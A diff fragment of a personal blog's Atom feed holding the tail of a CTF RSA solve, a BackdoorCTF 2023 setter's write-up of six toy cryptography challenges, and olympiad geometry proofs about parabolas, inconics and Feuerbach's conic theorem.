+        &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;phi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and this gives us our flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MAPNA{Br4nch_&amp;amp;_prun3_Or_4Nother_ApprOacH???}&lt;/code&gt;.  pretty cool trick aint it?&lt;/p&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>BackdoorCTF 2023</title>
+   <link href="http://localhost:4000/2023/12/19/backdoorctf-2023/"/>
+   <updated>2023-12-19T00:00:00+05:30</updated>
+   <id>http://localhost:4000/2023/12/19/backdoorctf-2023</id>
+   <content type="html">&lt;style&gt;
+.gist-collapsed {
+  max-height: 9rem;
+  overflow: hidden;
+  position: relative;
+  margin-bottom: 1rem;
+}
+
+.gist-collapsed::after {
+  content: &quot;Show more&quot;;
+  position: absolute;
+  bottom: 0;
+  right: 0;
+  padding: 6px 10px;
+  background: linear-gradient(to right, transparent, #fff);
+  cursor: pointer;
+  font-size: 0.9em;
+  color: #555;
+}
+
+.gist-expanded {
+  max-height: none;
+}
+
+.gist-expanded::after {
+  content: &quot;Show less&quot;;
+}
+&lt;/style&gt;
+
+&lt;script&gt;
+document.addEventListener(&quot;click&quot;, e =&gt; {
+  const box = e.target.closest(&quot;.gist-collapsed&quot;);
+  if (!box) return;
+  box.classList.toggle(&quot;gist-expanded&quot;);
+});
+&lt;/script&gt;
+
+&lt;p&gt;InfosecIITR hosted the annual CTF, “Backdoor CTF,” which ran for an impressive &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;48&lt;/code&gt; hours, starting from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;16th of December&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;18th of December&lt;/code&gt;. This was the first time I participated as a CTF organizer and a problem setter. Also, it was a huge event this time, with approximately &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1300 teams&lt;/code&gt; registering and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;800 teams&lt;/code&gt; having a non-zero score. I was anxious as well as excited to contribute by proposing problems for the event. In the end, I set a total of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;six problems&lt;/code&gt;, with crux ideas for two out of those six challenges. All the cryptography problems can be found &lt;a href=&quot;https://github.com/MmukulKhedekar/BackdoorCTF2023-Crypto&quot;&gt;here&lt;/a&gt;. I personally found &lt;a href=&quot;https://connor-mccartney.github.io/cryptography/other/BackdoorCTF-2023-writeups&quot;&gt;this&lt;/a&gt; writeup to be really cool and concise.&lt;/p&gt;
+
+&lt;p&gt;I’ll quickly explain a background of how i came up with these problems and a sketch of how to solve them.&lt;/p&gt;
+
+&lt;h2 id=&quot;mini_rsa_v1-310-solves&quot;&gt;mini_RSA_v1 [310 solves]&lt;/h2&gt;
+
+&lt;p&gt;I proposed the idea for this problem. It was scripted by my peer. We initially wanted to make a problem revolving around the cool identity&lt;/p&gt;
+
+\[p ^ q + q ^ p \equiv p + q \pmod{pq}\]
+
+&lt;p&gt;but then we realised that this problem had already appeared in contest earlier this year, so we had to scrap that. I realised that infact for any integers \(a\) and \(b\), it holds that,&lt;/p&gt;
+
+\[p^{\left( q^a\right)} + q^{\left( p^b\right)} \equiv p + q \pmod{pq}\]
+
+&lt;p&gt;and hence the problem.&lt;/p&gt;
+
+&lt;div class=&quot;gist-collapsed&quot;&gt;
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;&lt;script src=&quot;https://gist.github.com/5e6787833ada6725449960c741994294.js?file=mini_rsa_v1.py&quot;&gt; &lt;/script&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;mini_rsa_v2-77-solves&quot;&gt;mini_RSA_v2 [77 solves]&lt;/h2&gt;
+
+&lt;p&gt;I kinda overlooked the small size of the public exponent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e&lt;/code&gt; in the RSA encryption that lead to the unintended small exponent attack on the problem. since that wasn’t the intended solve, we rolled out the ver2 of the problem with a larger public exponent (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e = 65537&lt;/code&gt;). Now the intended way to solve this calculate the euler totient function of the public modulus using the extra leaked info (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s + t = p + q&lt;/code&gt;).&lt;/p&gt;
+
+&lt;div class=&quot;gist-collapsed&quot;&gt;
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;&lt;script src=&quot;https://gist.github.com/5e6787833ada6725449960c741994294.js?file=mini_rsa_v2.py&quot;&gt; &lt;/script&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;prsa-70-solves&quot;&gt;PRSA [70 solves]&lt;/h2&gt;
+
+&lt;p&gt;I know this was a kinda popular/textbook problem. There are lots of texts and implementations based on RSA on polynomial rings that you can find with a single google search. Nevertheless, I wanted it to be an introductory “sage” based problem, so I let it slip anyway.&lt;/p&gt;
+
+&lt;p&gt;A quick description of the challenge would be the textbook RSA problem but instead on polynomial rings instead of the ring of two coprime primes. The intended way to solve this was to factor the public modulus polynomial into two irreducible polynomials in the given polynomial ring and evaluate the euler totient using&lt;/p&gt;
+
+\[\mid \mathbb{F}[x]^{\star} / \left(P_1(x) P_2(x)\right) \mid = \mid \mathbb{F}[x]^{\star} / P_1(x) \times \mathbb{F}[x]^{\star} / P_2(x) \mid\]
+
+\[= \left(2 ^{\text{deg} \left(P_1(x) \right)} - 1 \right) \times \left(2 ^{\text{deg} \left(P_2(x) \right)} - 1 \right)\]
+
+&lt;p&gt;then using the euler totient, we calculate the private exponent and decrypt the message.&lt;/p&gt;
+
+&lt;p&gt;There was an unintended solve, where you brute force over the degree of the polynomials to reverse engineer the original polynomial degree (since the degrees were small). I had realised that there could be this unintended solve when I wrote this challenge, but I let it slip since I wanted this to be more about reading and writing sage codes.&lt;/p&gt;
+
+&lt;div class=&quot;gist-collapsed&quot;&gt;
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;&lt;script src=&quot;https://gist.github.com/5e6787833ada6725449960c741994294.js?file=prsa.py&quot;&gt; &lt;/script&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;rebellious-16-solves&quot;&gt;Rebellious [16 solves]&lt;/h2&gt;
+
+&lt;p&gt;Again a straight forward DLOG based challenge, but instead of implementing the system over an elliptic curve, I chose an Ellipse. There were many approaches to this problem. The intended solution was to observe that \(p \equiv 1 \pmod{4}\). This means that imaginary numbers exist in this prime field. Now you can observe that,&lt;/p&gt;
+
+\[\frac{x^2}{a^2} + \frac{y^2}{b^2} \equiv \left(\frac{x}{a} + \sqrt{-1} \frac{y}{b} \right) \cdot \left(\frac{x}{a} - \sqrt{-1} \frac{y}{b} \right) \equiv 1 \pmod{p}\]
+
+&lt;p&gt;If we let \(u = \left(\frac{x}{a} + \sqrt{-1} \frac{y}{b} \right)\) and \(v = \left(\frac{x}{a} - \sqrt{-1} \frac{y}{b} \right)\), it can be observed that&lt;/p&gt;
+
+\[v \equiv u ^ {-1} \pmod{p}\]
+
+&lt;p&gt;and similarly you can show that there’s an isomorphism mapping from the given group to \(\mathbb{F}_p\) explicity given by&lt;/p&gt;
+
+\[\phi \left( P (x, y)\right) = \left(\frac{x}{a} + \sqrt{-1} \frac{y}{b} \right) \pmod{p}\]
+
+&lt;p&gt;Now transform the problem to this prime field and solve the DLOG. I purposely chose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p&lt;/code&gt; to be an unsafe prime so that people choose this approach.&lt;/p&gt;
+
+&lt;div class=&quot;gist-collapsed&quot;&gt;
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;&lt;script src=&quot;https://gist.github.com/5e6787833ada6725449960c741994294.js?file=rebellious.py&quot;&gt; &lt;/script&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;secure-matrix-transmissions-20-solves&quot;&gt;Secure Matrix Transmissions [20 solves]&lt;/h2&gt;
+
+&lt;p&gt;I was motivated by the result that the diagonal matrix in the matrix diagonalization contains the eigenvalues of the matrix and thus this challenge. I chose a small dimension &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N = 6&lt;/code&gt; so that this becomes the intended approach as even a naive brute would require \((N! \times N!)\) operations and thats not too much.&lt;/p&gt;
+
+&lt;div class=&quot;gist-collapsed&quot;&gt;
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;&lt;script src=&quot;https://gist.github.com/5e6787833ada6725449960c741994294.js?file=smt_v1.py&quot;&gt; &lt;/script&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;gist-collapsed&quot;&gt;
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;&lt;script src=&quot;https://gist.github.com/5e6787833ada6725449960c741994294.js?file=smt_v1_intercepted_text.txt&quot;&gt; &lt;/script&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;secure-matrix-transmissions-v2-1-solve&quot;&gt;Secure Matrix Transmissions v2 [1 solve]&lt;/h2&gt;
+
+&lt;p&gt;This was system was implemented from the following &lt;a href=&quot;https://www.degruyter.com/document/doi/10.1515/jmc.2011.010/html&quot;&gt; paper&lt;/a&gt; under the heading BCFRX scheme. I really didnt want to throw challenges based off papers directly but I had no other choice since the teams on this CTF were really good at cryptography and had butchered almost all the other cryptography problems.&lt;/p&gt;
+
+&lt;p&gt;To break this system, one may implement the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linear Algebra&lt;/code&gt; attack of solving simultaneous systems of equations as described in the paper. Otherwise, as pointed out by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Neobeo&lt;/code&gt; &lt;a href=&quot;https://discord.com/channels/916568950375059476/916693278701781103/1187542230345470052&quot;&gt;here&lt;/a&gt; we may lift the group from \(\mathbb{F}_{p}\) to \(\mathbb{F}_{p^{10}}\) to diagonalise and solve for the shared secret as all the eigenvalues of the given matrices exist in the latter.&lt;/p&gt;
+
+&lt;div class=&quot;gist-collapsed&quot;&gt;
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;&lt;script src=&quot;https://gist.github.com/5e6787833ada6725449960c741994294.js?file=smt_v2.py&quot;&gt; &lt;/script&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;gist-collapsed&quot;&gt;
+&lt;noscript&gt;&lt;pre&gt;400: Invalid request&lt;/pre&gt;&lt;/noscript&gt;&lt;script src=&quot;https://gist.github.com/5e6787833ada6725449960c741994294.js?file=smt_v2_intercepted_text.txt&quot;&gt; &lt;/script&gt;
+&lt;/div&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Re-discovering the Artzt Parabola</title>
+   <link href="http://localhost:4000/2019/09/11/artzt-parabola/"/>
+   <updated>2019-09-11T00:00:00+05:30</updated>
+   <id>http://localhost:4000/2019/09/11/artzt-parabola</id>
+   <content type="html">&lt;h2 id=&quot;lets-try-to-motivate-this-parabola&quot;&gt;Let’s try to motivate this parabola!&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Let $d_1 , d_2$ be two abitrary lines that are not perpendicular. Let $A,B$ be abitrary points lie on $d_1,d_2$. How to construct a parabola that is tangent to $d_1,d_2$ at $A,B$.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I was working on this construction because it is impossible to construct a parabola tangent to two lines at given points in GeoGebra. While searching for some lemmas in &lt;em&gt;S.L. Loney’s Coordinate Geometry&lt;/em&gt;, I found the following result:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Let $\mathcal{P}$ be a parabola with $X,Y \in \mathcal{P}$.&lt;br /&gt;
+Let the tangents at $X,Y$ meet at $A$.&lt;br /&gt;
+Then,
+$ \triangle TAY \sim \triangle TXA$&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This lemma clearly motivates the construction of a parabola with focus at the Dumpty Point and so we have the following problem.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;problem&quot;&gt;&lt;strong&gt;Problem&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;Let $\triangle ABC$ be a triangle. Let $D$ be the midpoint of the $A$-symmedian chord. Let $M$ be the midpoint of $BC$. Let $AM$ intersect the nine-point circle at $M’$. Let $\ell$ be the line perpendicular to $AM$ at $M’$.&lt;/p&gt;
+
+&lt;p&gt;Prove that there exists a parabola $\mathcal{P}$ with focus at $D$, tangent to $AB$ and $AC$ at $B$ and $C$, and with directrix $\ell$.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;I showed this problem to some of my friends and they communicated back some really beautiful proofs for this, which I’d like to post here.&lt;/p&gt;
+
+&lt;h2 id=&quot;proof-by-shantanu-nene&quot;&gt;&lt;strong&gt;Proof (by Shantanu Nene)&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Let $B’$ and $C’$ be midpoints of $AC$ and $AB$ respectively.&lt;br /&gt;
+Let $\ell$ meet $AC,AB$ at $E,F$ respectively. Let $AM$ meet $BD$ at $P$ and $CD$ at $Q$.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Using angle chasing (symmedian properties, midpoint theorem, and the fact that $M’,B’,C’,M$ are concyclic), we see that $E,M’,D,Q,B’$ are concyclic. Hence
+$\angle EDC = \angle EM’Q = 90^\circ$.
+Similarly, $\angle FDB = 90^\circ$&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Thus it is sufficient to show that $B$ and $C$ lie on the parabola with focus $D$ and directrix $\ell$.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Let $G$ be the foot from $C$ to $\ell$. Since $\angle EDC = \angle EGC = 90^\circ$, and by angle chasing,
+$\angle ECD = \angle ECG$, the quadrilateral $EGCD$ is a kite.&lt;br /&gt;
+Hence $CG = CD$, so $C$ lies on the parabola.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Similarly, $B$ also lies on the parabola, and we are done.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;proof-by-aatman-supkar&quot;&gt;&lt;strong&gt;Proof (by Aatman Supkar)&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Consider an in-parabola of $AB’C’$ whose directrix is the perpendicular bisector of $AM’$.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Since the foci of the parabola are isogonal conjugates, if the axis is parallel to the $A$-median, the other focus lies on the $A$-symmedian.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Also, since the isogonal conjugate of a point at infinity lies on the circumcircle, the focus lies on $\odot(AB’C’)$, which is a homothety of ratio $\tfrac{1}{2}$ of $\odot(ABC)$ from $A$.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Therefore $D$ lies on this circle, and is the focus of the in-parabola.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;I posted this result on AoPS &lt;a href=&quot;https://artofproblemsolving.com/community/q1h1912112p13117117&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;, which has some more beautiful results and extensions.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Constructing Inconic from Pair of Isogonal Conjugates</title>
+   <link href="http://localhost:4000/2019/06/05/inconic-from-isogonal-conjugates/"/>
+   <updated>2019-06-05T00:00:00+05:30</updated>
+   <id>http://localhost:4000/2019/06/05/inconic-from-isogonal-conjugates</id>
+   <content type="html">&lt;h1 id=&quot;statement&quot;&gt;&lt;strong&gt;Statement&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Let $(P,Q)$ be a pair of isogonal conjugates with respect to $\triangle ABC$. Let $R$ be the midpoint of $PQ$. Let $M$ be the isotomic conjugate of the anticomplement of $R$. If $\triangle DEF$ is the cevian triangle of $M$ with respect to $\triangle ABC$, prove that $D,E,F$ are the tangency points of the inconic whose foci are $P$ and $Q$.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;proof&quot;&gt;Proof&lt;/h2&gt;
+&lt;h3 id=&quot;lemma-1&quot;&gt;&lt;strong&gt;Lemma 1&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;Let $P$ be a point outside ellipse $\mathcal E$. If $PX$ and $PY$ are tangents to $\mathcal E$ from $P$, and $F_1,F_2$ are the foci of $\mathcal E$, then $F_1P$ and $F_2P$ are isogonal with respect to $\angle XPY$.&lt;/p&gt;
+
+&lt;h4 id=&quot;proof-1&quot;&gt;&lt;strong&gt;Proof&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;Using the optical property of the ellipse, $P$ is the $F_1$-excenter with respect to $\triangle F_1XY$. $\square$&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;lemma-2&quot;&gt;&lt;strong&gt;Lemma 2&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;The complement of the Nagel point is the incenter.&lt;/p&gt;
+
+&lt;h4 id=&quot;proof-2&quot;&gt;&lt;strong&gt;Proof&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;Let $(I)$ touch $BC$ at $D$. Let $AE_A$ be the isotomic of $AD$, with $E_A\in BC$. Let
+\(AE_A\cap (I)=E \implies D,I,E\text{ are collinear}.\)
+Using &lt;em&gt;USAMO 2001/2&lt;/em&gt; and the fact that $IM_A\parallel AE_A$, we obtain
+\(IM_A=\tfrac12 AN_a \implies I,G,N_a\text{ are collinear},\)
+so $I$ is the complement of $N_a$. $\square$&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Let $\Omega$ be the inconic tangent at $D,E$ and $F$. It is enough to prove that $R$ is the center of this conic, as it is well known that the foci will be isogonal conjugates, and there is a unique conic tangent to the sides of the triangle, given its center.&lt;/p&gt;
+
+&lt;p&gt;We can now make $\Omega$ into a circle with an affine transformation. $M$ becomes the Gergonne point, so $R$ becomes the Nagel point, as it is still the isotomic conjugate of $M$. The anticomplement of the Nagel point is the incenter. Hence $R$ is the center of $\Omega$, and we are done.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Short Proof of Feuerbach's Conic Theorem</title>
+   <link href="http://localhost:4000/2019/06/01/feuerbach-conic-theorem/"/>
+   <updated>2019-06-01T00:00:00+05:30</updated>
+   <id>http://localhost:4000/2019/06/01/feuerbach-conic-theorem</id>
+   <content type="html">&lt;h1 id=&quot;statement&quot;&gt;&lt;strong&gt;Statement&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Let $\triangle ABC$ be a triangle inscribed in a rectangular hyperbola $\mathcal H$.
+Prove that the center of $\mathcal H$
+lies on the Nine–Point Circle of $\triangle ABC$.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;This is known as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Feuerbach&apos;s Conic Theorem&lt;/code&gt; as cited in &lt;em&gt;Coolidge, J. L. A Treatise on Algebraic Plane Curves. New York: Dover, 1959&lt;/em&gt;. I recently discovered a short proof for the same, so let’s go over that in this blog post.&lt;/p&gt;
+
+&lt;h2 id=&quot;proof&quot;&gt;Proof&lt;/h2&gt;
+&lt;p&gt;Let’s start with a pretty well-known result.&lt;/p&gt;
+
+&lt;h3 id=&quot;lemma-1&quot;&gt;&lt;strong&gt;Lemma 1&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;Let $\mathcal H$ be a rectangular hyperbola with a point $P$ on it and center $G$.
+The reflection of $P$ over $G$ lies on $\mathcal H$.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;This lemma is well known so we will not prove it here. Let’s use it to prove the statement at hand. Let $\mathcal H$ be a fixed rectangular hyperbola through the vertices of
+$\triangle ABC$.&lt;/p&gt;
+
+&lt;p&gt;If $H$ is the orthocenter of $\triangle ABC$, then $H$ also lies on $\mathcal H$.&lt;/p&gt;
+
+&lt;p&gt;Let $E_A, E_B, E_C$ be the midpoints of $AH, BH, CH$, and let
+$\triangle H_AH_BH_C$ be the orthic triangle of $\triangle ABC$.&lt;/p&gt;
+
+&lt;p&gt;Thus $E_AE_BE_CH_AH_BH_C$ is the Nine–Point Circle of $\triangle ABC$.&lt;/p&gt;
+
+&lt;p&gt;Let the tangents to $\mathcal H$ at $(A,H), (B,H), (C,H)$ meet at
+$K, M, N$ respectively. Then the lines
+$E_AK, E_BM, E_CN$ concur at a point $P$, which is the center of $\mathcal H$.&lt;/p&gt;
+
+&lt;p&gt;Consider the reflections of $H,A,B,C$ over $P$, denoted
+$Q,R,S,T$. Then $Q,R,S,T$ lie on $\mathcal H$.
+Since $AHRQ$ is a parallelogram, applying Pascal’s Theorem on
+$HHRQQA$ implies that the tangents at $H$ and $Q$ are parallel.&lt;/p&gt;
+
+&lt;p&gt;Let
+\(QS \cap AC = U,
+QR \cap BC = V,
+QT \cap AB = W.\)
+Then $\triangle VUW$ is the pedal triangle of $Q$ with respect to $\triangle ABC$.&lt;/p&gt;
+
+&lt;p&gt;Applying Pascal’s Theorem on $SQRACB$ and $TCBARQ$
+implies that $VUW$ is the Simson Line of $Q$.&lt;/p&gt;
+
+&lt;p&gt;Hence $Q$ lies on $(ABC)$, and therefore
+$P$ lies on the Nine–Point Circle. $\blacksquare$&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;Remark.&lt;/strong&gt;&lt;br /&gt;
+If $Q$ is the fourth intersection of the circum–rectangular hyperbola
+$\mathcal H$ of $\triangle ABC$ with $(ABC)$, then the Simson Line of $Q$
+passes through the center of $\mathcal H$.&lt;/p&gt;
+</content>
+ </entry>
+ 
+
+</feed>
